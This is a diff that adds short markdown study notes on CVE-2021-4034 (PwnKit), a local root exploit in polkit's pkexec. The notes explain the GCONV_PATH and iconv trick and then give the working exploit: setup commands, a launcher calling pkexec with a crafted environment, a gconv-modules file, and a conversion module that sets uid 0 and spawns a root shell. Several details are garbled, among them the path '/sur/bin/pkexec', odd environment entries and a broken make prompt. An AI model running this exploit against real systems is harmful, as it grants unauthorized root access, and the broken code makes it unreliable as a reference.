@@ -1,0 +1,74 @@
+# Apr 13, 2022 
+# CVE 2021-4034
+
+polkit, or policy kit, comes with most Linux distributions.
+
+Vulnerability affects *pkexec*, similar to "sudo"
+
+```
+user@host~$ program arg1 arg2
+```
+
+In memory, arguments live next to environment variables... separated by a 'null' byte
+
+Q: Where does the bug come from ?
+A: It comes from the g_printerr function which evaluates if characters are UTF-8 or else. If UTF-8, Print Error, else iconv_open > conv mod > Print Error.
+
+The "conv mod" conversion module is a shared library that anyone can write to.
+
+Goal: Trigger an error with different char set than UTF-8.
+
+GCONV_PATH variable is the perfect candidate.
+
+```
+mkdir 'GCONV_PATH=.'
+touch GCONV_PATH\=./pwn
+cd GCONV_PATH\=./
+chmod +x pwn
+```
+
+```
+pwnkit.c
+#include <unistd.h>
+int main()
+{
+char *argv[] = {NULL};
+char *envp[] = {
+"pwn",
+"TERN=..",
+"PATH=GCONV_PATH=.",
+"CHARSET=HIHI",
+NULL};
+
+execve("/sur/bin/pkexec", argv,envp);
+return 0;
+}
+```
+
+```
+user@host:~/exploit/pwn$ cat gconv-modules
+module  UTF-8// HIHI//  conversion-mod
+```
+
+```
+conversion-mod.c
+
+int gconv_init()
+{
+setuid(0);
+setgid(0);
+char *args[] = {"sh", NULL};
+char *envp[] = {"PATH=/bin:/usr/bin:/sbin",NULL};
+execvpe("/bin/sh", args,envp);
+return (__GCONV_OK);
+}
+int gconv() { return (__GCONV_OK); }
+```
+
+```
+user@host:~.make all
+```
+
+
+**Full code available on github, PwnFunction/CVE-2021-4034**
+
